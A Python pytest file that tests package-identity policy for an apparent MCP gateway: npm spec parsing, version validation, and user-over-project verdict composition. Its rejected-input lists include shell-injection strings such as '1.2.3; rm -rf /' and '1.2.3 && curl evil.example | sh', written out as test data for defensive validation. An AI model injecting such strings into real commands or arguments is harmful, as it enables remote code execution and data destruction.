"""Policy reasons about package IDENTITY, not the label an agent chose (S-01).

`register_discovered_server` accepts any agent-chosen npm package and
`provision` runs it with `npx -y`, while policy only ever saw the agent-chosen
*server name*: allowlisting `internal-approved-tool` executed
`npx -y totally-arbitrary-evil-package`. This file covers the policy half of the
fix -- the provisioning gate that consumes it lives in
`tests/test_package_identity_gate.py`.

Three rules here each have a natural implementation that reopens the hole, and
each has a test whose job is to fail against that implementation:

* **`"unspecified"` is not `"allowed"`.** Every boolean predicate in
  `PolicyManager` returns `True` when no section is configured. A package
  predicate built in that house style would read as an allowlist match to the
  gate, and every discovered package would provision with no approval at all.
* **Tri-state verdicts do not compose with `and`.** All three verdicts are
  truthy strings, so `user and project` returns the *project's* verdict: a user
  `"denied"` composed with a project `"allowed"` is `"allowed"`, a repository file
  inverting the operator's denylist (S-11, arriving through packages).
* **A spec is split before its name is validated.** `is_valid_package_name`
  rejects `pkg@1.2.3` because `@` is legal only as a scope prefix, and a scoped
  `@scope/pkg@1.2.3` must be split at its *second* `@`, not its first.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from pmcp.manifest.package_identity import PackageIdentity
from pmcp.policy.policy import PolicyManager
from pmcp.validation import (
    is_valid_package_name,
    is_valid_package_version,
    parse_package_spec,
)


def _identity(name: str, version: str = "1.2.3") -> PackageIdentity:
    return PackageIdentity(
        registry="npm", name=name, resolved_version=version, integrity=None
    )


def _write(path: Path, data: dict[str, Any]) -> Path:
    path.write_text(json.dumps(data))
    return path


def _explicit_policy(tmp_path: Path, data: dict[str, Any]) -> PolicyManager:
    """A manager over exactly *data*, via `--policy`.

    An explicit policy skips discovery entirely, so these tests never read the
    developer's real `~/.claude` policy and never depend on the discovery seam
    at all -- which is why they are unaffected by whether the operator paths
    resolve at import time or at call time (Consiliency/pmcp#262).
    """
    return PolicyManager(policy_path=_write(tmp_path / "policy.json", data))


def _discovery(monkeypatch: pytest.MonkeyPatch, *, project: Path, user: Path) -> None:
    """Point discovery at exactly these two candidates and nothing else.

    Replicates the helper in `tests/test_project_source_consent_policy.py`:
    both module lists are patched together, because `USER_POLICY_PATHS` is what
    marks a discovered path as operator-supplied (ungated) and
    `DEFAULT_POLICY_PATHS` is the ordered search list.
    """
    monkeypatch.setattr("pmcp.policy.policy.USER_POLICY_PATHS", [user])
    monkeypatch.setattr("pmcp.policy.policy.DEFAULT_POLICY_PATHS", [project, user])


def _composed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    approve_project_file: Any,
    *,
    user: dict[str, Any],
    project: dict[str, Any],
) -> PolicyManager:
    """A manager composing *user* with an APPROVED project policy.

    The project policy always also denies the server `project-marker`. Callers
    assert that denial took effect, so a project policy that was silently
    refused -- which would make every "the project cannot widen" assertion
    vacuously true -- fails the test instead of passing it.
    """
    project_data = dict(project)
    project_data["servers"] = {"denylist": ["project-marker"]}

    user_path = tmp_path / "user-policy.yaml"
    user_path.write_text(json.dumps(user))
    project_path = tmp_path / ".mcp-gateway-policy.yaml"
    project_path.write_text(json.dumps(project_data))
    approve_project_file(project_path)
    _discovery(monkeypatch, project=project_path, user=user_path)

    manager = PolicyManager()
    assert manager.is_server_allowed("project-marker") is False, (
        "the approved project policy was not applied; composition is untested"
    )
    return manager


# === spec parsing ===


def test_parse_package_spec_splits_a_scoped_name_from_its_version() -> None:
    """The scope's `@` is not a version separator.

    The first assertion is why the split must come first: the composed spec is
    not a valid package name, so validating before splitting refuses every
    pinned spec -- and searching from index 0 splits a scoped spec into an empty
    name and `scope/pkg@1.2.3`.
    """
    assert is_valid_package_name("@scope/pkg@1.2.3") is False

    assert parse_package_spec("@scope/pkg@1.2.3") == ("@scope/pkg", "1.2.3")
    assert parse_package_spec("@scope/pkg") == ("@scope/pkg", None)
    assert parse_package_spec("pkg@1.2.3") == ("pkg", "1.2.3")
    assert parse_package_spec("pkg") == ("pkg", None)
    assert parse_package_spec("@scope/pkg@latest") == ("@scope/pkg", "latest")

    # A trailing `@` names no version; reading it as "none requested" would let
    # `pkg@` stand in for `pkg@latest`, a version nobody named.
    for refused in (
        "",
        "pkg@",
        "@scope/pkg@",
        "@",
        "@scope",
        "-y",
        "--registry=https://evil.example@1.0.0",
        "../evil@1.0.0",
        "pkg name@1.0.0",
        "npm:evil@1.0.0",
    ):
        with pytest.raises(ValueError):
            parse_package_spec(refused)


# === version validation ===


def test_a_registry_supplied_version_with_metacharacters_is_rejected() -> None:
    """A resolved version is registry data bound for argv: allowlist, not denylist.

    Includes the shapes a lax pattern admits: a trailing newline (`$` matches
    before it), non-ASCII digits (`\\d` matches them), a leading `-` (a flag to
    `npx`), and ranges and tags, which pin nothing.
    """
    for accepted in (
        "1.2.3",
        "0.0.1",
        "10.20.30",
        "1.2.3-beta.1",
        "1.0.0-rc.0+build.5",
    ):
        assert is_valid_package_version(accepted) is True, accepted

    for refused in (
        "",
        "1.2.3; rm -rf /",
        "1.2.3 && curl evil.example | sh",
        "$(id)",
        "`id`",
        "1.2.3|sh",
        "1.2.3>out",
        "1.2.3\n",
        "\n1.2.3",
        " 1.2.3",
        "1.2.3 ",
        "-1.2.3",
        "--foo",
        "v1.2.3",
        "1.2",
        "01.2.3",
        "1.2.3-",
        "1.2.3+",
        "^1.2.3",
        "~1.2.3",
        ">=1.0.0",
        "1.x",
        "*",
        "latest",
        "1.2.3/../../etc",
        "١.٢.٣",
        "1.2.3-" + "a" * 300,
    ):
        assert is_valid_package_version(refused) is False, repr(refused)


# === single-policy verdicts ===


def test_a_policy_with_no_packages_section_returns_unspecified(tmp_path: Path) -> None:
    """No rule matched is `"unspecified"`, which the gate denies -- never allow.

    The server allowlist names the package's own name on purpose: the review's
    reproduction allowlisted `internal-approved-tool`, and a server-name rule
    must not leak into a package verdict.
    """
    manager = _explicit_policy(
        tmp_path, {"servers": {"allowlist": ["internal-approved-tool"]}}
    )

    verdict = manager.evaluate_package_policy(_identity("internal-approved-tool"))
    assert verdict == "unspecified"
    assert verdict != "allowed"
    assert (
        manager.evaluate_package_policy(_identity("totally-arbitrary-evil-package"))
        == "unspecified"
    )

    empty = PolicyManager(policy_path=_write(tmp_path / "empty.json", {}))
    assert empty.evaluate_package_policy(_identity("anything")) == "unspecified"


def test_evaluate_package_policy_denylist_beats_allowlist(tmp_path: Path) -> None:
    manager = _explicit_policy(
        tmp_path,
        {"packages": {"allowlist": ["*", "evil-pkg"], "denylist": ["evil-*"]}},
    )

    assert manager.evaluate_package_policy(_identity("evil-pkg")) == "denied"
    assert manager.evaluate_package_policy(_identity("good-pkg")) == "allowed"


def test_evaluate_package_policy_matches_a_scoped_name_glob(tmp_path: Path) -> None:
    """A scope glob matches that scope and nothing that merely resembles it.

    The round trip through `parse_package_spec` is the point: a scoped spec
    mis-split into name `""` would match nothing, and one mis-split so that the
    version rode along in the name would miss `@acme/*` and fall to
    `"unspecified"` -- both failures that phase close would not otherwise see.
    """
    manager = _explicit_policy(
        tmp_path,
        {"packages": {"allowlist": ["@acme/*"], "denylist": ["@evil/*"]}},
    )

    name, version = parse_package_spec("@acme/tool@1.2.3")
    assert version is not None
    assert manager.evaluate_package_policy(_identity(name, version)) == "allowed"

    name, version = parse_package_spec("@evil/tool@9.9.9")
    assert version is not None
    assert manager.evaluate_package_policy(_identity(name, version)) == "denied"

    for lookalike in ("acme-tool", "@acme-other/tool", "acme/tool", "@ACME/tool"):
        assert manager.evaluate_package_policy(_identity(lookalike)) == "unspecified", (
            lookalike
        )


def test_a_non_matching_allowlist_is_unspecified_not_denied(tmp_path: Path) -> None:
    """An allowlist grants; only a denylist denies.

    `"denied"` outranks the manifest exemption and every recorded approval in
    the gate's decision order, so reading an allowlist miss as a denial would
    make `packages: {allowlist: [x]}` silently block every manifest server and
    every approved package not named `x`. The miss still refuses downstream.
    """
    manager = _explicit_policy(tmp_path, {"packages": {"allowlist": ["only-this"]}})

    assert manager.evaluate_package_policy(_identity("only-this")) == "allowed"
    assert manager.evaluate_package_policy(_identity("something-else")) == "unspecified"


def test_package_globs_match_the_name_not_the_version(tmp_path: Path) -> None:
    """A glob is matched against the name alone.

    Matching `name@version` as well would widen: the package author chooses the
    prerelease tag, so `evil@1.0.0-mcp` would satisfy an allowlist `*-mcp` meant
    for names ending in `-mcp`.
    """
    manager = _explicit_policy(tmp_path, {"packages": {"allowlist": ["*-mcp"]}})

    assert (
        manager.evaluate_package_policy(_identity("evil", "1.0.0-mcp")) == "unspecified"
    )
    assert manager.evaluate_package_policy(_identity("github-mcp")) == "allowed"


def test_a_version_qualified_package_pattern_is_rejected_at_load(
    tmp_path: Path,
) -> None:
    """`pkg@1.2.3` in a list is refused loudly rather than silently never matching.

    Globs match names only, so a version-qualified denylist entry would match
    nothing -- a denial that fails open without a word. A policy carrying one is
    invalid instead, which #202 makes a startup refusal.
    """
    for entry in ("evil-pkg@1.2.3", "@evil/tool@1.2.3", "*@*"):
        with pytest.raises(ValueError):
            _explicit_policy(tmp_path, {"packages": {"denylist": [entry]}})

    # A scope's leading `@` is not a version separator.
    manager = _explicit_policy(tmp_path, {"packages": {"denylist": ["@evil/*", "@*"]}})
    assert manager.evaluate_package_policy(_identity("@evil/tool")) == "denied"


def test_evaluate_package_policy_with_no_identity_is_unspecified(
    tmp_path: Path,
) -> None:
    """No identity names nothing a list could match; the gate decides what follows."""
    manager = _explicit_policy(tmp_path, {"packages": {"denylist": ["*"]}})

    assert manager.evaluate_package_policy(None) == "unspecified"


# === composition with an approved project policy ===


def test_a_project_allowed_package_cannot_override_a_user_denied_package(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, approve_project_file: Any
) -> None:
    """The integration test for the tri-state composition rule.

    With `user and project`, this returns the project's `"allowed"`.
    """
    manager = _composed(
        tmp_path,
        monkeypatch,
        approve_project_file,
        user={"packages": {"denylist": ["evil-pkg"]}},
        project={"packages": {"allowlist": ["evil-pkg"]}},
    )

    assert manager.evaluate_package_policy(_identity("evil-pkg")) == "denied"


def test_a_project_allowed_package_never_independently_grants(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, approve_project_file: Any
) -> None:
    """A project `"allowed"` can only fail to deny; the user's verdict decides."""
    manager = _composed(
        tmp_path,
        monkeypatch,
        approve_project_file,
        user={},
        project={"packages": {"allowlist": ["repo-chosen-pkg"]}},
    )

    assert (
        manager.evaluate_package_policy(_identity("repo-chosen-pkg")) == "unspecified"
    )


def test_a_project_denied_package_is_denied_even_when_the_user_allows_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, approve_project_file: Any
) -> None:
    """Narrowing is the one direction a project policy may move a verdict."""
    manager = _composed(
        tmp_path,
        monkeypatch,
        approve_project_file,
        user={"packages": {"allowlist": ["shared-pkg", "other-pkg"]}},
        project={"packages": {"denylist": ["shared-pkg"]}},
    )

    assert manager.evaluate_package_policy(_identity("shared-pkg")) == "denied"
    assert manager.evaluate_package_policy(_identity("other-pkg")) == "allowed"
